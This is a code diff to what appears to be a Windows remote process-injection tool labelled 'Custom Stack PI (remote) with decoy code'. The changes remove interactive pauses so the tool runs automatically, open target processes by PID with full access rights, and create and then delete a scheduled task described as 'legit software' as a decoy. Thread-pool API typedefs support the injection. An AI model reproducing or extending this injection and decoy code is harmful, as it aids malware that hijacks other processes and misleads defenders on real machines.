@@ -17,6 +17,10 @@ Custom Stack PI (remote) with decoy code
 #pragma comment(lib, "uuid")
 //
 
+
+
+//define SimpleSleep
+void SimpleSleep(DWORD dwMilliseconds);
 wchar_t* get_filename_from_path(wchar_t *path) {
     wchar_t *filename = wcsrchr(path, L'\\');
     return filename ? filename + 1 : path;
@@ -32,7 +36,8 @@ int create_and_run_task(const char *program_path) {
     // initialize COM library
     hr = CoInitialize(NULL);
 
-    printf("COM initialized.\n"); getchar();
+    printf("COM initialized.\n"); 
+    SimpleSleep(2000);
 
     if (SUCCEEDED(hr)) {
         // get Task Scheduler object
@@ -49,7 +54,7 @@ int create_and_run_task(const char *program_path) {
         return 1;
     }
 
-    printf("Task Scheduler object is up.\n"); getchar();
+    printf("Task Scheduler object is up.\n"); 
 
     // Generate a unique task name
     time_t now = time(NULL);
@@ -74,7 +79,23 @@ int create_and_run_task(const char *program_path) {
     pITask->SetComment(L"Let's execute some legit software");
     pITask->SetApplicationName(program_to_execute);
     pITask->SetWorkingDirectory(L"C:\\Windows\\System32");
+	pITask->SetParameters(L"C:\\Users\\legit.txt");
 
+    // Set principal for highest privileges
+    // char* username = getCurrentUsername();
+    // if (username != NULL) {
+    //     printf("[+] Current Username: %s\n", username);
+    //     wchar_t wUsername[256];
+    //     mbstowcs(wUsername, username, sizeof(wUsername) / sizeof(wchar_t));
+
+    //     // Pass the username to SetAccountInformation
+    //     hr = pITask->SetAccountInformation(wUsername, NULL);
+    //     if (FAILED(hr)) {
+    //         printf("[-] Failed to set account information. Error: %lx\n", hr);
+    //     } else {
+    //         printf("[+] Successfully set account information.\n");
+    //     }
+    // }
     // Set principal for highest privileges
     hr = pITask->SetAccountInformation(L"", NULL); // Run with the default account
 
@@ -102,11 +123,10 @@ int create_and_run_task(const char *program_path) {
     }
 
     printf("Created task.\n");
-    // Sleep for 2 seconds:
-    Sleep(2000);
 
     // run the task
     hr = pITask->Run();
+    SimpleSleep(4000);
     pITask->Release();
 
     if (FAILED(hr)) {
@@ -116,7 +136,8 @@ int create_and_run_task(const char *program_path) {
     }  
     printf("Task ran.\n");
 
-    printf("Check C:\\Windows\\Tasks folder\n"); getchar();
+    printf("Check C:\\Windows\\Tasks folder\n"); 
+    SimpleSleep(1000);
 
     // and remove the task
     pITS->Delete(pwszTaskName);
@@ -131,9 +152,6 @@ int create_and_run_task(const char *program_path) {
 
 typedef DWORD(WINAPI *PFN_GETLASTERROR)();
 typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
-
-//define SimpleSleep
-void SimpleSleep(DWORD dwMilliseconds);
 
 
 typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
@@ -251,10 +269,12 @@ int main(int argc, char *argv[]) {
         printf("[+] PID provided: %d\n", pid);
         // get pi information from pid:
         pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-        pi.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pid);
-        if (pi.hProcess == NULL || pi.hThread == NULL) {
-            printf("[-] Failed to open process or thread.\n");
+        if (pi.hProcess == NULL) {
+            printf("[-] Failed to open process. Error: %lu\n", GetLastError());
+        } else {
+            printf("[DEBUG] Successfully opened process with handle: %p\n", pi.hProcess);
         }
+
     } else if (argc == 2 && strcmp(argv[1], "-ppid") == 0) {
         printf("[+] -ppid flag detected\n");
         ppidFlag = TRUE;
@@ -286,6 +306,12 @@ int main(int argc, char *argv[]) {
             } while (Process32Next(hProcessSnap, &pe32));
         }
         printf("PID of the process: %d\n", pid);
+        pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+        if (pi.hProcess == NULL) {
+            printf("[-] Failed to open process. Error: %lu\n", GetLastError());
+        } else {
+            printf("[DEBUG] Successfully opened process with handle: %p\n", pi.hProcess);
+        }
         CloseHandle(hProcessSnap);
     } else {
         printf("[-] PID not provided\n");
